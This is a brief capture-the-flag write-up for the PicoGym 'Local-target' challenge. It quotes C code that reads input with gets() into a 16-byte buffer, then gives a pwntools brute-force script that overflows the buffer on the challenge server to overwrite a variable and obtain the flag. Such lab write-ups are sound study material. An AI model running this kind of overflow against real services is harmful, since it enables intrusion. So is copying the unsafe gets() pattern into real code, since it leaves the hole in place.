# PicoGym - Local-target

- Write-Up Author: looy3 


## Write up  

---
I first opened the source code. It indicated that the win condition would be achieved if I could set another variable named "num" declared right after the input char array (of 16). I guessed that because the input char array had an index of 16, any value greater than 16 entered into the array (through gets) would probably give me a buffer overflow. 	
```
  char input[16];
  int num = 64;

  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");

  printf("num is %d\n", num);
  ```
  Turns out that was not the case. Too lazy to work out the logic of what payload or payload length would be necessary, I decided to play around using a simple pwntools script which iteratively generated a greater 'A' payload. 
  ```
  from pwn import *


i=1
while i < 200:
   s = remote("saturn.picoctf.net", 63942)
   s.sendline(b"A"*i)
   print(i, s.recvall())
   i=i+1
   ```
Ironically, this script unintentionally gave me the flag. I guess this is because the ASCII value of A is 65. A 24 byte long payload seemed to do the trick. 

Things I don't understand:
- Why 24 and not 16?
- Why does num become such random numbers after 25? 